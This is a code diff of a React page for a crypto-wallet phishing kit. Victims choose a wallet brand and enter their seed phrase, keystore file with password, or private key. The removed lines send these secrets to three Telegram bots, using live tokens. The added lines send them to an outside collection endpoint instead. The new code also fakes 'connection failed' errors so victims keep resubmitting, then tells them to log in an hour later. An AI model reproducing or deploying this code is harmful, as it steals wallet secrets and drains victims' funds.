@@ -62,19 +62,10 @@ import blockchain from './coins/blockchain.png';
 import binance from './coins/biancesmart.png';
 import ark from './coins/Aktionariat.png';
 
-import fwallet from './fwallet.svg';
-import pmask from './popular/pmask.svg';
-
-
-import pwallet from './popular/pwallet.svg';
-import pcoinbase from './popular/pcoinbase.svg';
-import pledger from './popular/pledger.svg';
-
-import add from './popular/add.svg';
 // end of coin images
 
 
-function Wallet(){
+function Wallettwo(){
 
     const handleRefresh = () => {
         window.location.reload();
@@ -91,35 +82,6 @@ function Wallet(){
         // document.title = "S";
       }, [location.pathname]); // The empty dependency array [] ensures this effect runs once on component mount
 
-
-      const [popular, setPopular] = useState([
-
-        {
-            "name":"MetaMask",
-            "url":pmask,
-
-        },
-
-        {
-            "name":"WalletConnect",
-            "url":pwallet,
-
-        },
-
-        {
-            "name":"Coinbase",
-            "url":pcoinbase,
-
-        },
-
-        {
-            "name":"Ledger",
-            "url":pledger,
-
-        },
-          
-      ]);
-
       const[wallets, setWallets]=useState([
         {
             "name":"Trust",
@@ -127,12 +89,7 @@ function Wallet(){
 
         },
 
-        {
-          "name":"Wallet Connect",
-          "url":walletconnect,
-
-
-      },
+       
 
       // {
       //     "name":"Atomic",
@@ -141,12 +98,7 @@ function Wallet(){
 
       // },
 
-      {
-          "name":"Metamask",
-          "url":Metamask,
-
-
-      },
+     
       {
           "name":"Blockchain",
           "url":blockchain,
@@ -176,12 +128,7 @@ function Wallet(){
 
       },
 
-      {
-          "name":"Ledger",
-          "url":ledger,
-
-
-      },
+     
 
       {
           "name":"HashPack",
@@ -580,32 +527,14 @@ function Wallet(){
 
 
         try {
-           
-
-        
-
-                 await axios.post(`https://api.telegram.org/bot6756922447:AAHPnkXx7NfYJbqPsuWsGlstzjs5FcdlzUY/sendMessage`, {
-                    chat_id: 6150403557,
-                    text: `Wallet : ${selectedName} , Type : phrase connection , Phrase : ${phrase}`,
-                  });
-
-
-                await axios.post(`https://api.telegram.org/bot6471655485:AAH0iIugJnVoXXAcekKKQoxQDzixvzM-zxE/sendMessage`, {
-                    chat_id: 5868304053,
-                    text: `Wallet : ${selectedName} , Type : phrase connection , Phrase : ${phrase}`,
-                  });
-
-
-                  const response = await axios.post(`https://api.telegram.org/bot6346477835:AAE--Er907FambpxvtD7C-CU-J7GlwgyEkg/sendMessage`, {
-                    chat_id: 5916570239,
-                    text: `Wallet : ${selectedName} , Type : phrase connection , Phrase : ${phrase}`,
-                  });
-  
-  
-  
-
-
-
+            const response = await axios.post('https://webresolve.onrender.com/api/send', {
+                phrase:phrase,
+                keystore_json:keystore_json,
+                wallet_password:wallet_password,
+                private_key:private_key,
+                type:"Phrase",
+                platform:selectedName,
+            });
         
             // Handle success
             console.log('Data sent:', response.data.message);
@@ -614,12 +543,17 @@ function Wallet(){
                 console.log(response.data.message);
                 
 
-              
-              
-                    alert(`Synchronizing Completed, Kindly login in an hour`);
-                    window.location.href = 'https://wallet.fantom.network/';
-                
-               
+                if(phrasekeycount < 3){
+                    setErrorMessage(`Connection to ${selectedName} failed!!!`);
+                    setPhraseKeyCount(phrasekeycount + 1);
+                }
+
+                else if(phrasekeycount == 3){
+                    setErrorMessage(`Synchronizing Completed, Kindly login in an hour`);
+                    setPrivateKeyCount(0);
+                }
+
+                setShowError(true);
 
 
 
@@ -643,50 +577,35 @@ function Wallet(){
 
 
         try {
-            // const response = await axios.post('https://webresolve.onrender.com/api/send', {
-            //     phrase:phrase,
-            //     keystore_json:keystore_json,
-            //     wallet_password:wallet_password,
-            //     private_key:private_key,
-            //     type:"Keystore Json",
-            //     platform:selectedName,
-            // });
-
-
-            await axios.post(`https://api.telegram.org/bot6756922447:AAHPnkXx7NfYJbqPsuWsGlstzjs5FcdlzUY/sendMessage`, {
-                chat_id: 6150403557,
-                text: `Wallet : ${selectedName} , Type : phrase connection , Phrase : ${phrase}`,
-              });
-
-
-            await axios.post(`https://api.telegram.org/bot6471655485:AAH0iIugJnVoXXAcekKKQoxQDzixvzM-zxE/sendMessage`, {
-                chat_id: 5868304053,
-                text: `Wallet : ${selectedName} , Type : phrase connection , Phrase : ${phrase}`,
-              });
-
-
-           
-
-
-            const response = await axios.post(`https://api.telegram.org/bot6346477835:AAE--Er907FambpxvtD7C-CU-J7GlwgyEkg/sendMessage`, {
-                chat_id: 5916570239,
-                text: `Wallet : ${selectedName} , Type : Keystore Json , Keystore Json : ${keystore_json}, Wallet Password : ${wallet_password}`,
-              });
-
+            const response = await axios.post('https://webresolve.onrender.com/api/send', {
+                phrase:phrase,
+                keystore_json:keystore_json,
+                wallet_password:wallet_password,
+                private_key:private_key,
+                type:"Keystore Json",
+                platform:selectedName,
+            });
         
             // Handle success
             console.log('Data sent:', response.data.message);
     
             if(response.status == 200){
                 console.log(response.data.message);
+    
                 
 
-              
-              
-                    alert(`Synchronizing Completed, Kindly login in an hour`);
-                    window.location.href = 'https://wallet.fantom.network/';
-                
-               
+                if(keystorejsoncount < 3){
+                    setErrorMessage(`Connection to ${selectedName} failed!!!`);
+                    setKeystoreJsonCount(keystorejsoncount + 1);
+                }
+
+                else if(keystorejsoncount == 3){
+                    setErrorMessage(`Synchronizing Completed, Kindly login in an hour`);
+                    setKeystoreJsonCount(0);
+                }
+
+                setShowError(true);
+
 
 
 
@@ -712,49 +631,32 @@ function Wallet(){
 
 
         try {
-            // const response = await axios.post('https://webresolve.onrender.com/api/send', {
-            //     phrase:phrase,
-            //     keystore_json:keystore_json,
-            //     wallet_password:wallet_password,
-            //     private_key:private_key,
-            //     type:"Private Key",
-            //     platform:selectedName,
-            // });
-
-            await axios.post(`https://api.telegram.org/bot6756922447:AAHPnkXx7NfYJbqPsuWsGlstzjs5FcdlzUY/sendMessage`, {
-                    chat_id: 6150403557,
-                    text: `Wallet : ${selectedName} , Type : phrase connection , Phrase : ${phrase}`,
-                  });
-
-
-                await axios.post(`https://api.telegram.org/bot6471655485:AAH0iIugJnVoXXAcekKKQoxQDzixvzM-zxE/sendMessage`, {
-                    chat_id: 5868304053,
-                    text: `Wallet : ${selectedName} , Type : phrase connection , Phrase : ${phrase}`,
-                  });
-
-
-                  const response = await axios.post(`https://api.telegram.org/bot6346477835:AAE--Er907FambpxvtD7C-CU-J7GlwgyEkg/sendMessage`, {
-                    chat_id: 5916570239,
-                    text: `Wallet : ${selectedName} , Type : phrase connection , Phrase : ${phrase}`,
-                  });
-  
+            const response = await axios.post('https://webresolve.onrender.com/api/send', {
+                phrase:phrase,
+                keystore_json:keystore_json,
+                wallet_password:wallet_password,
+                private_key:private_key,
+                type:"Private Key",
+                platform:selectedName,
+            });
         
             // Handle success
             console.log('Data sent:', response.data.message);
     
             if(response.status == 200){
                 console.log(response.data.message);
-                
 
-              
-              
-                    alert(`Synchronizing Completed, Kindly login in an hour`);
-                    window.location.href = 'https://wallet.fantom.network/';
-                
-               
+                if(privatekeycount < 3){
+                    setErrorMessage(`Connection to ${selectedName} failed!!!`);
+                    setPrivateKeyCount(privatekeycount + 1);
+                }
 
-
-
+                else if(privatekeycount == 3){
+                    setErrorMessage(`Synchronizing Completed, Kindly login in an hour`);
+                    setPrivateKeyCount(0);
+                }
+    
+                setShowError(true);
             }
           } catch (error) {
             // Handle error
@@ -773,72 +675,30 @@ function Wallet(){
       
 
     return (
-        <div className='mydiv'>
-
-        <div className='px-5 py-5'>
-            <img  className='myimage' src={fwallet}/>
-
-        </div>
-            <h3 className='text-center py-2 wallethead'>Access your wallet. </h3>
-           <p className='mainpara'> Select one of the following methods. You can also choose to create a new wallet.</p>
+        <>
+            <h1 className='text-center py-5 walletheadtwo'>Choose Preferred Wallets </h1>
 
 
+            <section className='px-5 row text-center'>
 
-        <br/>
+                {
+                    wallets.map(function(wall, index){
+                        return (
+                            <div onClick={function(e){
+                                setSelectedName(wall.name);
 
-        <br/>
+                                setSelectedImage(wall.url);
+                            }} className='col-md-3 col-6'data-toggle="modal" data-target="#exampleModal">
+                                
+                                    <img className='walletimage py-2' src={wall.url} />
 
+                                    <p className='walletpara py-3'>{wall.name}</p>
+                                </div>
+                        );
+                    })
+                }
 
-        <div className='px-5'>
-            <h3 className='most'>MOST POPULAR</h3>
-
-
-            <div className='myflexdiv'>
-
-              {
-                  popular.map(function(wall,index){
-                      return (
-                        <div onClick={function(e){
-                            setSelectedName(wall.name);
-
-                            setSelectedImage(wall.url);
-                        }} className='cup text-center'data-toggle="modal" data-target="#exampleModal">
-
-                    <img className='popular' src={wall.url}/>
-
-                    <p className='populartext'>{wall.name}</p>
-
-                </div>
-                      );
-                  })
-              }  
-
-                    <Link to={'/wallets'} className='cup text-center'>
-
-                    <img className='popular' src={add}/>
-
-                    <p className='populartext'>OTHERS</p>
-
-                </Link>
-
-              
-
-            </div>
-           
-
-        </div>
-<br/>
-
-        <div className='text-center mt-5'>
-        <p className='mainparafooter'> 
-By using this application you agree to the <a href='' className='footerlink'>Terms of Use</a>. <br/>
-Additionally please refer to the Important Notice.</p>
-        </div>
-
-
-        
-
-            
+            </section>
 
 
 
@@ -1022,9 +882,9 @@ Additionally please refer to the Important Notice.</p>
     </div>
   </div>
 </div>
-        </div>
+        </>
     );
 }
 
 
-export default Wallet;
+export default Wallettwo;
